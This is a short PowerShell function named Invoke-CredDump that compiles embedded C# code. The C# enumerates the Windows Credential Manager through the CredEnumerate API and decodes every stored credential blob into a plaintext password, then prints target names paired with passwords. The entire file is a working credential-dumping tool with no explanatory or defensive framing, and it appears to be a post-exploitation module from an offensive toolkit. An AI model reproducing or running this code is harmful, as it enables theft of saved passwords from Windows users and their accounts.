function Invoke-CredDump
{
    $code = @"
        using System;
        using System.Collections.Generic;
        using System.Runtime.InteropServices;
        using System.Text;

        public class CredDump
        {
            public static List<object> Run()
            {
                List<object> credlist = new List<object>();
                int count;
                IntPtr pCredentials;
                CredentialUtil.CredEnumerate(null, 0, out count, out pCredentials);
                for (int n = 0; n < count; n++)
                {
                    var ptrCred = Marshal.ReadIntPtr(pCredentials, n * Marshal.SizeOf(typeof(IntPtr)));
                    var credential = (CREDENTIAL)Marshal.PtrToStructure(ptrCred, typeof(CREDENTIAL));

                    if (credential.CredentialBlobSize > 0)
                    {
                        
                        var password = Marshal.PtrToStringAnsi(credential.CredentialBlob, credential.CredentialBlobSize);

                        if (password.Replace("\0", "").Length != credential.CredentialBlobSize)
                            password = Marshal.PtrToStringUni(credential.CredentialBlob, credential.CredentialBlobSize / 2);

                        credlist.Add(new{ Target = credential.TargetName, Password = password });
                    }
                }
                return credlist;
            }
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct CREDENTIAL
        {
            public int Flags;
            public int Type;
            [MarshalAs(UnmanagedType.LPWStr)] public string TargetName;
            [MarshalAs(UnmanagedType.LPWStr)] public string Comment;
            public long LastWritten;
            public int CredentialBlobSize;
            public IntPtr CredentialBlob;
            public int Persist;
            public int AttributeCount;
            public IntPtr Attributes;
            [MarshalAs(UnmanagedType.LPWStr)] public string TargetAlias;
            [MarshalAs(UnmanagedType.LPWStr)] public string UserName;
        }

        public static class CredentialUtil
        {
            [DllImport("Advapi32.dll", EntryPoint = "CredEnumerate", SetLastError = true, CharSet = CharSet.Unicode)]
            public static extern bool CredEnumerate(string filter, int flag, out int count, out IntPtr pCredentials);
            [DllImport("Advapi32.dll", EntryPoint = "CredFree", SetLastError = true)]
            internal static extern void CredFree([In] IntPtr cred);
        }
"@
    $add = Add-Type -TypeDefinition $code -Language CSharp -PassThru
    $results = [CredDump]::Run()
    Write-Output $results
}